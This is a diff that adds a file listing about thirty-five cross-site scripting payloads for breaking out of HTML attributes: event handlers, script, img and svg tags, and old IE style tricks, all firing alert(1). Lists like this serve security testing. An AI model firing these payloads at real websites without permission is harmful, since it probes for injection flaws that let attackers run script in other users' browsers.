@@ -1,0 +1,35 @@
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onmouseover="alert(1)"
+' onmouseover='alert(1)'
+" onfocusin="alert(1)" autofocus="
+' onfocusin='alert(1)' autofocus='
+" onclick="alert(1)" id="xss
+' onclick='alert(1)' id='xss
+" onload="alert(1)"
+' onload='alert(1)'
+" onerror="alert(1)"
+' onerror='alert(1)'
+" onpointerenter="alert(1)"
+' onpointerenter='alert(1)'
+" ontoggle="alert(1)"
+' ontoggle='alert(1)'
+" style="xss:expression(alert(1))"
+' style='xss:expression(alert(1))'
+x" onblur="alert(1)" autofocus tabindex="1
+x' onblur='alert(1)' autofocus tabindex='1
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+" style="behavior:url(#default#time2)" onbegin="alert(1)"
+" name="xss" oninput="alert(1)"
+' name='xss' oninput='alert(1)'
+" onchange="alert(1)"
+' onchange='alert(1)'
+" onanimationstart="alert(1)" class="anim
+' onanimationstart='alert(1)' class='anim
+" onscroll="alert(1)" style="overflow:auto;width:50px;height:50px;" id="x
+' onscroll='alert(1)' style='overflow:auto;width:50px;height:50px;' id='x
